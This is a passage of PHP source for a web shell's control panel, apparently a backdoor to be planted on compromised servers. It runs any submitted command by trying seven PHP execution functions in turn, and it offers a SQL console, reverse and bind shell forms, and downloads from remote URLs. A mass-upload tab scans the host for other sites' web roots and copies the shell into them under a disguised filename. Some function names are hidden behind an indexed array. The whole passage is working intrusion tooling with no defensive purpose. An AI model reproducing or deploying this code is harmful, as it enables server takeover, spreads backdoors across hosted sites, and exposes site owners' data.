                                </tr>
                                <?php endforeach; ?>
                                
                                <!-- Files -->
                                <?php foreach ($display_files as $file): 
                                    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                                    $icon = 'fa-file';
                                    if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'])) $icon = 'fa-file-image text-info';
                                    else if (in_array($ext, ['php', 'html', 'htm', 'js', 'css', 'py', 'sh', 'pl', 'rb'])) $icon = 'fa-file-code text-success';
                                    else if (in_array($ext, ['txt', 'md', 'log', 'ini', 'conf', 'xml', 'json'])) $icon = 'fa-file-alt text-secondary';
                                    else if (in_array($ext, ['zip', 'tar', 'gz', 'rar', '7z'])) $icon = 'fa-file-archive text-warning';
                                    else if (in_array($ext, ['mp3', 'wav', 'ogg', 'flac'])) $icon = 'fa-file-audio text-primary';
                                    else if (in_array($ext, ['mp4', 'avi', 'mov', 'mkv'])) $icon = 'fa-file-video text-danger';
                                    else if (in_array($ext, ['pdf'])) $icon = 'fa-file-pdf text-danger';
                                    else if (in_array($ext, ['doc', 'docx'])) $icon = 'fa-file-word text-primary';
                                    else if (in_array($ext, ['xls', 'xlsx'])) $icon = 'fa-file-excel text-success';
                                    else if (in_array($ext, ['ppt', 'pptx'])) $icon = 'fa-file-powerpoint text-warning';
                                ?>
                                <tr>
                                    <td>
                                        <a href="?dir=<?= urlencode($path) ?>&item=<?= urlencode($file) ?>&action=view<?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="text-decoration-none text-light">
                                            <i class="fa <?= $icon ?>"></i> <?= htmlspecialchars($file) ?>
                                        </a>
                                    </br>
                                    <td><?= ($func[25]('mime_content_type') ? htmlspecialchars($func[24]($path . '/' . $file)) : htmlspecialchars($func[8]($path . '/' . $file))) ?></br>
                                    <td><?= $func[26]($path . '/' . $file) ?></br>
                                    <td><?= htmlspecialchars($func[35]($path . '/' . $file)) ?></br>
                                    <td>
                                        <span class="badge bg-secondary"><?= $func[11]($func[10]('%o', $func[6]($path . '/' . $file)), -4); ?></span>
                                    </br>
                                    <td><?= $func[23]("Y-m-d H:i", $func[7]($path . '/' . $file)); ?></br>
                                    <td>
                                        <div class="btn-group btn-group-sm">
                                            <a href="?dir=<?= urlencode($path) ?>&item=<?= urlencode($file) ?>&action=edit<?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light" title="Edit">
                                                <i class="fa fa-edit"></i>
                                            </a>
                                            <a href="?dir=<?= urlencode($path) ?>&item=<?= urlencode($file) ?>&action=rename<?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light" title="Rename">
                                                <i class="fa fa-i-cursor"></i>
                                            </a>
                                            <a href="?dir=<?= urlencode($path) ?>&item=<?= urlencode($file) ?>&action=chmod<?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light" title="Permissions">
                                                <i class="fa fa-key"></i>
                                            </a>
                                            <a href="?dir=<?= urlencode($path) ?>&item=<?= urlencode($file) ?>&action=info<?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light" title="Info">
                                                <i class="fa fa-info-circle"></i>
                                            </a>
                                            <a href="?dir=<?= urlencode($path) ?>&download=1&item=<?= urlencode($file) ?>" class="btn btn-outline-light" title="Download">
                                                <i class="fa fa-download"></i>
                                            </a>
                                            <a href="?dir=<?= urlencode($path) ?>&item=<?= urlencode($path . '/' . $file) ?>&action=delete<?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light" onclick="return confirm('Delete file \'<?= htmlspecialchars($file) ?>\'?')" title="Delete">
                                                <i class="fa fa-trash"></i>
                                            </a>
                                        </div>
                                    </br>
                                </tr>
                                <?php endforeach; ?>
                                
                                <?php if (empty($display_folders) && empty($display_files)): ?>
                                <tr>
                                    <td colspan="7" class="text-center text-muted">📂 No items found</br>
                                </tr>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                    
                    <!-- Refresh Button -->
                    <div class="row mt-3">
                        <div class="col-md-12">
                            <div class="d-flex justify-content-center">
                                <a href="?dir=<?= urlencode($path) ?>" class="btn btn-outline-light btn-sm">
                                    <i class="fa fa-refresh"></i> Refresh
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
                
                
                <!-- Command Tab -->
                <div class="tab-pane fade" id="command" role="tabpanel">
                    <form action="" method="post" class="mb-3" id="commandForm">
                        <input type="hidden" name="active_tab" value="command">
                        <div class="mb-3">
                            <label class="form-label">Command</label>
                            <input type="text" class="form-control form-control-sm" name="command" placeholder="Enter command" value="<?= isset($_POST['command']) ? htmlspecialchars($_POST['command']) : '' ?>">
                        </div>
                        <button type="submit" class="btn btn-outline-light btn-sm">Execute</button>
                    </form>

                    <?php if (isset($_POST['command']) && (!isset($_POST['active_tab']) || $_POST['active_tab'] === 'command')) : ?>
                    <div class="card card-body bg-dark">
                        <?php
                        function execute_command($cmd) {
                            $output = '';
                            $success = false;

                            // Method 1: proc_open (most reliable)
                            if (function_exists('proc_open')) {
                                $descriptorspec = array(
                                    0 => array("pipe", "r"),
                                    1 => array("pipe", "w"),
                                    2 => array("pipe", "w")
                                );
                                $process = @proc_open($cmd, $descriptorspec, $pipes);
                                if (is_resource($process)) {
                                    $stdout = stream_get_contents($pipes[1]);
                                    fclose($pipes[1]);
                                    $stderr = stream_get_contents($pipes[2]);
                                    fclose($pipes[2]);
                                    $return_value = proc_close($process);
                                    if ($return_value === 0 && !empty($stdout)) {
                                        return ['success' => true, 'output' => $stdout];
                                    }
                                }
                            }

                            // Method 2: shell_exec
                            if (function_exists('shell_exec')) {
                                $result = @shell_exec($cmd);
                                if ($result !== null && $result !== false && $result !== '') {
                                    return ['success' => true, 'output' => $result];
                                }
                            }

                            // Method 3: exec
                            if (function_exists('exec')) {
                                $output_lines = array();
                                $return_var = -1;
                                @exec($cmd, $output_lines, $return_var);
                                if ($return_var === 0 && !empty($output_lines)) {
                                    return ['success' => true, 'output' => implode("\n", $output_lines)];
                                }
                            }

                            // Method 4: system
                            if (function_exists('system')) {
                                ob_start();
                                $return_var = -1;
                                @system($cmd, $return_var);
                                $result = ob_get_clean();
                                if ($return_var === 0 && !empty($result)) {
                                    return ['success' => true, 'output' => $result];
                                }
                            }

                            // Method 5: passthru
                            if (function_exists('passthru')) {
                                ob_start();
                                $return_var = -1;
                                @passthru($cmd, $return_var);
                                $result = ob_get_clean();
                                if ($return_var === 0 && !empty($result)) {
                                    return ['success' => true, 'output' => $result];
                                }
                            }

                            // Method 6: popen
                            if (function_exists('popen')) {
                                $handle = @popen($cmd, 'r');
                                if (is_resource($handle)) {
                                    $result = '';
                                    while (!feof($handle)) {
                                        $result .= fread($handle, 4096);
                                    }
                                    pclose($handle);
                                    if (!empty($result)) {
                                        return ['success' => true, 'output' => $result];
                                    }
                                }
                            }

                            // Method 7: backticks (same as shell_exec but different syntax)
                            if (function_exists('shell_exec')) {
                                $result = @`$cmd`;
                                if ($result !== null && $result !== false && $result !== '') {
                                    return ['success' => true, 'output' => $result];
                                }
                            }

                            return ['success' => false, 'output' => ''];
                        }

                        $result = execute_command($_POST['command']);

                        if ($result['success'] && !empty($result['output'])) {
                            $output = preg_split('/\r\n|\r|\n/', trim($result['output']));
                            echo "<table class='table table-dark table-sm table-striped table-bordered'>";
                            echo "<thead><tr><th colspan='10' class='text-center'>Command Output: " . htmlspecialchars($_POST['command']) . "</th></tr></thead>";
                            echo "<tbody>";

                            foreach ($output as $line) {
                                if (trim($line) === '') continue;

                                // Split by whitespace but keep quoted strings intact
                                $columns = preg_split('/\s+/', trim($line));
                                $columns = array_map('trim', $columns);
                                $columns = array_filter($columns, function($col) {
                                    return $col !== '';
                                });

                                if (!empty($columns)) {
                                    echo "<tr>";
                                    foreach ($columns as $column) {
                                        echo "<td>" . htmlspecialchars($column) . "</td>";
                                    }
                                    // Fill remaining columns to maintain table structure
                                    $remaining = 10 - count($columns);
                                    for ($i = 0; $i < $remaining; $i++) {
                                        echo "<td></td>";
                                    }
                                    echo "</tr>";
                                } else {
                                    // For empty lines, just show the line as is
                                    echo "<tr><td colspan='10'>" . htmlspecialchars($line) . "</td></tr>";
                                }
                            }
                            echo "</tbody></table>";
                        } else {
                            // Try to get error output
                            $error_output = '';
                            if (function_exists('shell_exec')) {
                                $error_output = @shell_exec($_POST['command'] . " 2>&1");
                            }
                            if (empty($error_output)) {
                                $error_output = "Command executed but returned no output or failed.";
                            }
                            echo "<pre class='text-danger border p-3'>Error/Output:\n" . htmlspecialchars($error_output) . "</pre>";
                        }
                        ?>
                    </div>
                    <?php endif; ?>
                </div>
                
                <!-- Database Tab -->
                <div class="tab-pane fade" id="database" role="tabpanel">
                    <div class="card card-body bg-dark mb-3">
                        <h5>Database Connection</h5>
                        <form action="" method="post">
                            <input type="hidden" name="active_tab" value="database">
                            <div class="row g-2 mb-2">
                                <div class="col-md-6">
                                    <input type="text" class="form-control form-control-sm" name="db_host" placeholder="Host" value="<?= isset($_POST['db_host']) ? htmlspecialchars($_POST['db_host']) : 'localhost' ?>">
                                </div>
                                <div class="col-md-6">
                                    <input type="text" class="form-control form-control-sm" name="db_name" placeholder="Database (optional)" value="<?= isset($_POST['db_name']) ? htmlspecialchars($_POST['db_name']) : '' ?>">
                                </div>
                            </div>
                            <div class="row g-2 mb-2">
                                <div class="col-md-6">
                                    <input type="text" class="form-control form-control-sm" name="db_user" placeholder="Username" value="<?= isset($_POST['db_user']) ? htmlspecialchars($_POST['db_user']) : 'root' ?>">
                                </div>
                                <div class="col-md-6">
                                    <input type="password" class="form-control form-control-sm" name="db_pass" placeholder="Password">
                                </div>
                            </div>
                            <button type="submit" class="btn btn-outline-light btn-sm">Connect</button>
                        </form>
                    </div>
                    
                    <?php if (isset($_SESSION['db_conn'])) : ?>
                    <div class="card card-body bg-dark mb-3">
                        <h5>SQL Query</h5>
                        <form action="" method="post">
                            <input type="hidden" name="active_tab" value="database">
                            <div class="mb-2">
                                <textarea name="sql_query" rows="3" class="form-control form-control-sm" placeholder="SELECT * FROM users"><?= isset($_POST['sql_query']) ? htmlspecialchars($_POST['sql_query']) : '' ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-outline-light btn-sm">Execute</button>
                        </form>
                    </div>
                    
                    <?php if (isset($_SESSION['sql_result'])) : ?>
                    <div class="card card-body bg-dark">
                        <h5>Query Results</h5>
                        <div class="table-responsive">
                            <table class="table table-dark table-sm">
                                <thead>
                                    <tr>
                                        <?php if (!empty($_SESSION['sql_result'])) : ?>
                                        <?php foreach (array_keys($_SESSION['sql_result'][0]) as $column) : ?>
                                        <th><?= htmlspecialchars($column) ?></th>
                                        <?php endforeach; ?>
                                        <?php endif; ?>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($_SESSION['sql_result'] as $row) : ?>
                                    <tr>
                                        <?php foreach ($row as $value) : ?>
                                        <td><?= htmlspecialchars($value) ?></td>
                                        <?php endforeach; ?>
                                    </tr>
                                    <?php endforeach; ?>
                                </tbody>
                             </table>
                        </div>
                    </div>
                    <?php unset($_SESSION['sql_result']); endif; ?>
                    <?php endif; ?>
                </div>
                
                <!-- Shell Tab -->
                <div class="tab-pane fade" id="shell" role="tabpanel">
                    <div class="card card-body bg-dark mb-3">
                        <h5>Reverse Shell</h5>
                        <form action="" method="post">
                            <input type="hidden" name="active_tab" value="shell">
                            <div class="row g-2">
                                <div class="col-md-8">
                                    <input type="text" class="form-control form-control-sm" name="reverse_ip" placeholder="Your IP" value="<?= isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? htmlspecialchars($_SERVER['HTTP_X_FORWARDED_FOR']) : (isset($_SERVER['REMOTE_ADDR']) ? htmlspecialchars($_SERVER['REMOTE_ADDR']) : '') ?>">
                                </div>
                                <div class="col-md-2">
                                    <input type="number" class="form-control form-control-sm" name="reverse_port" placeholder="Port" value="4444">
                                </div>
                                <div class="col-md-2">
                                    <button type="submit" class="btn btn-outline-light btn-sm w-100">Connect</button>
                                </div>
                            </div>
                        </form>
                    </div>
                    
                    <div class="card card-body bg-dark">
                        <h5>Bind Shell</h5>
                        <form action="" method="post">
                            <input type="hidden" name="active_tab" value="shell">
                            <div class="row g-2">
                                <div class="col-md-2">
                                    <input type="number" class="form-control form-control-sm" name="bind_port" placeholder="Port" value="4444">
                                </div>
                                <div class="col-md-2">
                                    <button type="submit" class="btn btn-outline-light btn-sm w-100">Listen</button>
                                </div>
                                <div class="col-md-8">
                                    <small class="text-muted">After starting, connect with: nc [IP] [PORT]</small>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                
                <!-- Download/Upload Tab -->
                <div class="tab-pane fade" id="download" role="tabpanel">
                    <!-- Download from URL -->
                    <div class="card card-body bg-dark mb-3">
                        <h5><i class="fa fa-download"></i> Download from URL</h5>
                        <form action="" method="post" enctype="multipart/form-data">
                            <input type="hidden" name="active_tab" value="download">
                            <div class="row g-2 mb-2">
                                <div class="col-md-8">
                                    <input type="url" class="form-control form-control-sm" name="remote_url" placeholder="http://example.com/file.txt" required>
                                </div>
                                <div class="col-md-4">
                                    <input type="text" class="form-control form-control-sm" name="local_path" placeholder="save_as.txt" value="<?= htmlspecialchars($path) ?>/">
                                </div>
                            </div>
                            <button type="submit" name="download_url" class="btn btn-outline-light btn-sm">Download File</button>
                        </form>
                    </div>
                                    
                    <!-- Mass Downloader -->
                    <div class="card card-body bg-dark mb-3">
                        <h5><i class="fa fa-cloud-download"></i> Mass Downloader</h5>
                        <form action="" method="post" enctype="multipart/form-data">
                            <input type="hidden" name="active_tab" value="download">
                            <div class="mb-2">
                                <textarea name="mass_urls" rows="5" class="form-control form-control-sm" placeholder="http://example.com/file1.jpg&#10;http://example.com/file2.jpg&#10;http://example.com/file3.jpg" required></textarea>
                            </div>
                            <div class="row g-2 mb-2">
                                <div class="col-md-8">
                                    <input type="text" class="form-control form-control-sm" name="mass_path" placeholder="Save to directory" value="<?= htmlspecialchars($path) ?>">
                                </div>
                                <div class="col-md-4">
                                    <button type="submit" name="mass_download" class="btn btn-outline-light btn-sm w-100">Download All</button>
                                </div>
                            </div>
                        </form>
                    </div>
                                
                    <!-- Direct Upload -->
                    <div class="card card-body bg-dark mb-3">
                        <h5><i class="fa fa-upload"></i> Direct Upload</h5>
                        <form action="" method="post" enctype="multipart/form-data">
                            <input type="hidden" name="active_tab" value="download">
                            <div class="mb-2">
                                <input type="file" class="form-control form-control-sm" name="direct_upload[]" multiple required>
                            </div>
                            <div class="row g-2">
                                <div class="col-md-8">
                                    <input type="text" class="form-control form-control-sm" name="upload_path" placeholder="Upload directory" value="<?= htmlspecialchars($path) ?>">
                                </div>
                                <div class="col-md-4">
                                    <button type="submit" name="direct_upload_btn" class="btn btn-outline-light btn-sm w-100">Upload Files</button>
                                </div>
                            </div>
                        </form>
                    </div>
                                
                    <!-- File Manager Shortcut -->
                    <div class="card card-body bg-dark">
                        <h5><i class="fa fa-folder"></i> Quick Actions</h5>
                        <div class="row">
                            <div class="col-md-6">
                                <a href="?dir=<?= urlencode($path) ?>" class="btn btn-outline-light btn-sm w-100 mb-2">
                                    <i class="fa fa-refresh"></i> Refresh Current Directory
                                </a>
                            </div>
                            <div class="col-md-6">
                                <a href="?dir=<?= urlencode(dirname($path)) ?>" class="btn btn-outline-light btn-sm w-100 mb-2">
                                    <i class="fa fa-level-up"></i> Go to Parent Directory
                                </a>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Mass Upload Tab -->
                <div class="tab-pane fade" id="massupload" role="tabpanel">
                    <!-- Domain List -->
                    <div class="card card-body bg-dark mb-3">
                        <h5><i class="fa fa-globe"></i> Available Domains</h5>
                        <div class="mb-2">
                            <button type="button" class="btn btn-outline-info btn-sm" onclick="deepScanDomains()">
                                <i class="fa fa-search"></i> Deep Scan for Domains
                            </button>
                            <a href="?dir=<?= urlencode('/home/' . get_current_user()) ?>" class="btn btn-outline-secondary btn-sm">
                                <i class="fa fa-folder-open"></i> Go to Home
                            </a>
                            <small class="text-muted ms-2">Click "Deep Scan" to find all domains</small>
                        </div>
                        <div id="domainsContainer">
                            <?php
                            // ADVANCED DOMAIN SCANNER - Recursively finds web roots
                            function findWebRoots($base_path, $depth = 0, $max_depth = 3) {
                                $found = [];
                                if ($depth > $max_depth || !is_dir($base_path)) return $found;

                                $items = @scandir($base_path);
                                if (!$items) return $found;

                                foreach ($items as $item) {
                                    if ($item == '.' || $item == '..') continue;
                                    if (strpos($item, '.') === 0) continue; // Skip hidden

                                    $full_path = $base_path . '/' . $item;
                                    if (!is_dir($full_path)) continue;

                                    // Skip common system dirs
                                    $skip_dirs = ['tmp', 'logs', 'cache', 'backups', 'etc', 'bin', 'dev', 'proc', 'sys', 'usr', 'lib', 'mail', 'ssl', '.cpanel', '.softaculous'];
                                    if (in_array($item, $skip_dirs)) continue;

                                    // Check if this looks like a web root
                                    $is_web_root = false;

                                    // Has index.php?
                                    if (file_exists($full_path . '/index.php')) {
                                        $is_web_root = true;
                                    }
                                    // Has wp-config.php?
                                    elseif (file_exists($full_path . '/wp-config.php')) {
                                        $is_web_root = true;
                                    }
                                    // Has .htaccess?
                                    elseif (file_exists($full_path . '/.htaccess')) {
                                        $is_web_root = true;
                                    }
                                    // Has public_html subfolder? (then that's the web root, not this)
                                    elseif (is_dir($full_path . '/public_html')) {
                                        // Add the public_html as web root
                                        $public_html = $full_path . '/public_html';
                                        if (is_dir($public_html)) {
                                            $found[$item . '/public_html'] = [
                                                'name' => $item . '/public_html',
                                                'web_root' => $public_html,
                                                'type' => 'cPanel style'
                                            ];
                                        }
                                        continue; // Don't mark the parent as web root
                                    }

                                    if ($is_web_root) {
                                        $found[$item] = [
                                            'name' => $item,
                                            'web_root' => $full_path,
                                            'type' => 'web root'
                                        ];
                                    } else {
                                        // Recursively scan deeper
                                        $deeper = findWebRoots($full_path, $depth + 1, $max_depth);
                                        $found = array_merge($found, $deeper);
                                    }
                                }
                                return $found;
                            }

                            // Start scanning from common locations
                            $web_roots = [];
                            $scan_locations = [
                                '/home/' . get_current_user(),
                                $_SERVER['DOCUMENT_ROOT'],
                                dirname($_SERVER['DOCUMENT_ROOT']),
                                '/var/www',
                                '/var/www/html'
                            ];

                            foreach ($scan_locations as $loc) {
                                if (is_dir($loc)) {
                                    $web_roots = array_merge($web_roots, findWebRoots($loc, 0, 3));
                                }
                            }

                            // Also check public_html subfolders directly
                            $public_html = $_SERVER['DOCUMENT_ROOT'] ?? '/home/' . get_current_user() . '/public_html';
                            if (is_dir($public_html)) {
                                $items = scandir($public_html);
                                foreach ($items as $item) {
                                    if ($item == '.' || $item == '..') continue;
                                    if (strpos($item, '.') === 0) continue;

                                    $full = $public_html . '/' . $item;
                                    if (is_dir($full)) {
                                        // Check if it's likely a domain (contains dot or has index)
                                        if (strpos($item, '.') !== false || file_exists($full . '/index.php')) {
                                            $web_roots[$item] = [
                                                'name' => $item,
                                                'web_root' => $full,
                                                'type' => 'public_html subfolder'
                                            ];
                                        }
                                    }
                                }
                            }

                            // Remove duplicates and sort
                            ksort($web_roots);

                            if (empty($web_roots)) {
                                echo '<div class="alert alert-warning">';
                                echo '<i class="fa fa-info-circle"></i> No web roots found. ';
                                echo 'Try navigating to a folder that might contain websites.';
                                echo '</div>';
                            } else {
                                echo '<div class="row">';
                                foreach ($web_roots as $key => $info) {
                                    ?>
                                    <div class="col-md-4 mb-2">
                                        <div class="card bg-dark border-success">
                                            <div class="card-body p-2">
                                                <div class="form-check">
                                                    <input class="form-check-input domain-checkbox" type="checkbox" 
                                                           value="<?= htmlspecialchars($info['web_root']) ?>" 
                                                           id="domain_<?= md5($key) ?>">
                                                    <label class="form-check-label text-success" for="domain_<?= md5($key) ?>">
                                                        <i class="fa fa-globe"></i> <?= htmlspecialchars($key) ?>
                                                    </label>
                                                </div>
                                                <small class="text-muted d-block">Path: <?= htmlspecialchars($info['web_root']) ?></small>
                                                <small class="text-muted d-block">
                                                    <a href="?dir=<?= urlencode($info['web_root']) ?>" class="text-info" target="_blank">
                                                        <i class="fa fa-folder-open"></i> Browse
                                                    </a>
                                                </small>
                                            </div>
                                        </div>
                                    </div>
                                    <?php
                                }
                                echo '</div>';
                            }
                            ?>
                        </div>

                        <!-- Select All / Deselect All Buttons -->
                        <div class="mt-2">
                            <button type="button" class="btn btn-outline-light btn-sm" onclick="selectAllDomains(true)">
                                <i class="fa fa-check-square"></i> Select All
                            </button>
                            <button type="button" class="btn btn-outline-light btn-sm" onclick="selectAllDomains(false)">
                                <i class="fa fa-square-o"></i> Deselect All
                            </button>
                        </div>
                    </div>

                    <!-- Upload File to Selected Domains -->
                    <div class="card card-body bg-dark mb-3">
                        <h5><i class="fa fa-cloud-upload"></i> Upload File to Selected Domains</h5>
                        <form action="" method="post" enctype="multipart/form-data" id="massUploadForm">
                            <input type="hidden" name="active_tab" value="massupload">
                            <input type="hidden" name="mass_upload_action" value="upload">

                            <div class="mb-3">
                                <label class="form-label">Select File to Upload</label>
                                <input type="file" class="form-control form-control-sm" name="mass_upload_file" required>
                                <small class="text-muted">This file will be uploaded to all selected domains</small>
                            </div>

                            <div class="mb-3">
                                <label class="form-label">Target Filename (optional)</label>
                                <input type="text" class="form-control form-control-sm" name="target_filename" placeholder="Leave empty to keep original name">
                                <small class="text-muted">Rename file when uploading (e.g., shell.php, index.php)</small>
                            </div>

                            <div class="mb-3">
                                <label class="form-label">Selected Domains (<span id="selectedCount">0</span>)</label>
                                <div id="selectedDomainsList" class="small text-muted" style="max-height: 100px; overflow-y: auto;">
                                    None selected
                                </div>
                            </div>

                            <button type="submit" name="mass_upload_submit" class="btn btn-success btn-sm" onclick="return confirm('Upload to all selected domains?')">
                                <i class="fa fa-cloud-upload"></i> Upload to Selected Domains
                            </button>
                        </form>
                    </div>

                    <!-- Upload Shell to Selected Domains -->
                    <div class="card card-body bg-dark mb-3">
                        <h5><i class="fa fa-bolt"></i> Upload Shell to Selected Domains</h5>
                        <form action="" method="post" id="uploadShellForm">
                            <input type="hidden" name="active_tab" value="massupload">
                            <input type="hidden" name="mass_upload_action" value="shell">

                            <div class="mb-3">
                                <label class="form-label">Shell Filename</label>
                                <input type="text" class="form-control form-control-sm" name="shell_filename" value=".//3.G.V.3.0.1 .php" required>
                                <small class="text-muted">The current shell will be copied with this filename</small>
                            </div>

                            <div class="mb-3">
                                <label class="form-label">Selected Domains (<span id="shellSelectedCount">0</span>)</label>
                                <div id="shellSelectedDomainsList" class="small text-muted" style="max-height: 100px; overflow-y: auto;">
                                    None selected
                                </div>
                            </div>

                            <button type="submit" name="mass_upload_submit" class="btn btn-danger btn-sm" onclick="return confirm('Upload shell to all selected domains?')">
                                <i class="fa fa-bolt"></i> Upload Shell
                            </button>
                        </form>
                    </div>

                    <!-- Create File in Selected Domains -->
                    <div class="card card-body bg-dark mb-3">
                        <h5><i class="fa fa-file-code"></i> Create File in Selected Domains</h5>
                        <form action="" method="post" id="createFileForm">
                            <input type="hidden" name="active_tab" value="massupload">
                            <input type="hidden" name="mass_upload_action" value="create">

                            <div class="mb-3">
                                <label class="form-label">Filename</label>
                                <input type="text" class="form-control form-control-sm" name="create_filename" placeholder="e.g., config.php" required>
                            </div>

                            <div class="mb-3">
                                <label class="form-label">File Content</label>
                                <textarea name="create_content" rows="5" class="form-control form-control-sm font-monospace" placeholder="Enter file content..."></textarea>
                            </div>

                            <div class="mb-3">
                                <label class="form-label">Selected Domains (<span id="createSelectedCount">0</span>)</label>
                                <div id="createSelectedDomainsList" class="small text-muted" style="max-height: 100px; overflow-y: auto;">
                                    None selected
                                </div>
                            </div>

                            <button type="submit" name="mass_upload_submit" class="btn btn-primary btn-sm" onclick="return confirm('Create file in all selected domains?')">
                                <i class="fa fa-file-code"></i> Create File
                            </button>
                        </form>
                    </div>

                    <!-- Results Display -->
                    <?php if (isset($_SESSION['mass_upload_results'])): ?>
                    <div class="card card-body bg-dark">
                        <h5><i class="fa fa-list"></i> Upload Results</h5>
                        <div class="table-responsive">
                            <table class="table table-dark table-sm table-bordered">
                                <thead>
                                    <tr>
                                        <th>Domain</th>
                                        <th>Status</th>
                                        <th>Message</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($_SESSION['mass_upload_results'] as $result): ?>
                                    <tr>
                                        <td><?= htmlspecialchars($result['domain']) ?></br>
                                        <td>
                                            <?php if ($result['success']): ?>
                                                <span class="badge bg-success">SUCCESS</span>
                                            <?php else: ?>
                                                <span class="badge bg-danger">FAILED</span>
                                            <?php endif; ?>
                                        </br>
                                        <td><?= htmlspecialchars($result['message']) ?></br>
                                    </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                        <?php unset($_SESSION['mass_upload_results']); ?>
                    </div>
                    <?php endif; ?>
                                            
                    <!-- JavaScript for domain selection and deep scan -->
                    <script>
                    function selectAllDomains(select) {
                        document.querySelectorAll('.domain-checkbox').forEach(cb => {
                            cb.checked = select;
                        });
                        updateSelectedDomains();
                    }
                                            
                    function updateSelectedDomains() {
                        const selected = [];
                        const selectedPaths = [];
                        document.querySelectorAll('.domain-checkbox:checked').forEach(cb => {
                            const label = cb.nextElementSibling;
                            const domainName = label ? label.textContent.trim() : 'Unknown';
                            selected.push(domainName);
                            selectedPaths.push(cb.value);
                        });
                                            
                        // Update counts and lists for all forms
                        document.getElementById('selectedCount').textContent = selected.length;
                        document.getElementById('shellSelectedCount').textContent = selected.length;
                        document.getElementById('createSelectedCount').textContent = selected.length;
                                            
                        const listHtml = selected.length > 0 ? selected.join('<br>') : 'None selected';
                        document.getElementById('selectedDomainsList').innerHTML = listHtml;
                        document.getElementById('shellSelectedDomainsList').innerHTML = listHtml;
                        document.getElementById('createSelectedDomainsList').innerHTML = listHtml;
                                            
                        // Add hidden inputs to forms
                        updateFormHiddenInputs(selectedPaths);
                    }
                                            
                    function updateFormHiddenInputs(selectedPaths) {
                        // Remove existing hidden inputs
                        ['massUploadForm', 'uploadShellForm', 'createFileForm'].forEach(formId => {
                            const form = document.getElementById(formId);
                            const oldInputs = form.querySelectorAll('input[name="selected_domains[]"]');
                            oldInputs.forEach(input => input.remove());
                                            
                            // Add new hidden inputs for selected domains
                            selectedPaths.forEach(path => {
                                const input = document.createElement('input');
                                input.type = 'hidden';
                                input.name = 'selected_domains[]';
                                input.value = path;
                                form.appendChild(input);
                            });
                        });
                    }
                                            
                    function deepScanDomains() {
                        // This would ideally be an AJAX call to a server-side scanner,
                        // but for simplicity, we'll just refresh the page with a flag
                        window.location.href = window.location.pathname + '?deep_scan=1&tab=massupload';
                    }
                                            
                    // Update on checkbox change
                    document.querySelectorAll('.domain-checkbox').forEach(cb => {
                        cb.addEventListener('change', updateSelectedDomains);
                    });
                                            
                    // Initial update
                    updateSelectedDomains();
                    </script>
                </div>
                                            
                <!-- System Info Tab -->
                <div class="tab-pane fade" id="info" role="tabpanel">
                    <!-- System Information -->
                    <div class="card card-body bg-dark mb-3">
                        <h5><i class="fa fa-server"></i> System Information</h5>
                        <table class="table table-dark table-sm table-bordered">
                            <tr>
                                <th width="30%">Hostname</th>
                                <td><?= htmlspecialchars(gethostname()) ?></br>
                            </tr>
                            <tr>
                                <th>OS/Architecture</th>
                                <td><?= htmlspecialchars(php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname('m')) ?></br>
                            </tr>
                            <tr>
                                <th>System Details</th>
                                <td><?= htmlspecialchars($func[0]()) ?></br>
                            </tr>
                            <tr>
                                <th>Server Software</th>
                                <td><?= htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') ?></br>
                            </tr>
                            <tr>
                                <th>Server Protocol</th>
                                <td><?= htmlspecialchars($_SERVER['SERVER_PROTOCOL'] ?? 'Unknown') ?></br>
                            </tr>
                            <tr>
                                <th>Server IP</th>
                                <td><?= !@$_SERVER['SERVER_ADDR'] ? htmlspecialchars($func[19]($_SERVER['SERVER_NAME'] ?? 'localhost')) : htmlspecialchars(@$_SERVER['SERVER_ADDR']) ?></br>
                            </tr>
                            <tr>
                                <th>Server Port</th>
                                <td><?= htmlspecialchars($_SERVER['SERVER_PORT'] ?? 'Unknown') ?></br>
                            </tr>
                            <tr>
                                <th>Document Root</th>
                                <td><?= htmlspecialchars($_SERVER['DOCUMENT_ROOT'] ?? 'Unknown') ?></br>
                            </tr>
                            <tr>
                                <th>Current User</th>
                                <td><?= htmlspecialchars($func[36]()) ?> (UID: <?= @getmyuid() ?>, GID: <?= @getmygid() ?>)</br>
                            </tr>
                            <tr>
                                <th>Current Directory</th>
                                <td><?= htmlspecialchars($func[12]()) ?></br>
                            </tr>
                            <tr>
                                <th>Script Path</th>
                                <td><?= htmlspecialchars($_SERVER['SCRIPT_FILENAME'] ?? 'Unknown') ?></br>
                            </tr>
                            <tr>
                                <th>Client IP</th>
                                <td><?= htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? 'Unknown') ?> (<?= htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') ?>)</br>
                            </tr>
                        </table>
                    </div>

                    <!-- PHP Configuration -->
                    <div class="card card-body bg-dark mb-3">
                        <h5><i class="fa fa-cog"></i> PHP Configuration</h5>
                        <table class="table table-dark table-sm table-bordered">
                            <?php
                            $php_configs = [
                                'PHP Version' => phpversion(),
                                'PHP SAPI' => php_sapi_name(),
                                'PHP OS' => PHP_OS,
                                'PHP Architecture' => (PHP_INT_SIZE * 8) . '-bit',
                                'Memory Limit' => ini_get('memory_limit'),
                                'Max Execution Time' => ini_get('max_execution_time') . ' seconds',
                                'Max Input Time' => ini_get('max_input_time') . ' seconds',
